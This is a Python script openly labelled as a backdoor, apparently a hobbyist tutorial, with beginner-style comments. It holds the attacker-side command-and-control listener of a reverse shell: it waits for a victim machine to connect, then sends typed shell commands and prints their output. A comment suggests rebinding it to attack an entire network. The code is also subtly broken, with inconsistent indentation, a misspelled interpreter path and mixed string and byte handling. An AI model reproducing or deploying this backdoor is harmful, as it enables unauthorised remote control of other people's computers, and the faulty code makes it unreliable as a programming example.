								## ============== ADVANCE BACKDOOR IN PYTHON ================= ##
					    			## ============== WITH MANY PROPERTISE ============= ##
					   

		                                   #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

		                                            ########    ### ##
		                                            ###   ##    ###    ## 
		                                            ########    ###       ##
		                                            ###         ###         ##    
		                                            ########    ###        ##
		                                            ###   ##    ###     ##
		                                            ########    ### ##
		                                                        
		                                    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#!/user/bin/python
import socket
import json   # This library is taken ,because through this you can send and get as many as bytes of data as you want from the client.  


def reliable_send(data) :
	json_data=json.dumps(data) # dumps is used to ( encoding to JSON objects )
	target.send(json_data) 
    


def reliable_recv():
	json_data=""
	while True:
         	try :
         		json_data=json_data + target.recv(1024)
				return json.loads(json_data)#loads() is used for ( Decoding the JSON string )
			except ValueError:
				continue    # Here continue means that when bytes will exceed its limit of 1024 then the loop will run again.
def Shell():
	while True:

		command=input("* Shell~%s " %str(ip) )
		reliable_send(command)
		if command=="q":
			break
		else:
			result=reliable_recv()
			print(result)

def Server():

    global s
	global ip
	global target        

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) ## INET means family of IPv4 Address , and Sock_Stream mean connection with client with TCP protocol
	s.setsockopt(socket.SOL_SOCKET , socket.SO_REUSEADDR, 1) # SOL_SOCKET is the socket layer itself. It is used for options that are protocol independent
		                                                 # SO_REUSEADDR allows your server to bind to an address which is in a. TIME_WAIT state.
	
	s.bind(("127.0.0.1",54321)) # You can change this address if you want to attacl on entire network. And 54321 is a random port.
	s.listen(5) # mean it will only accept connections till "5" and will reject "6th" connection.
	print("Listening for Incoming Connections!!!")
	target ,ip=s.accept() # target is a targets sock which will be store in the memory. and IP is of target IP Address.
	print("Target Connected!!!")


Server()

Shell()

s.close()
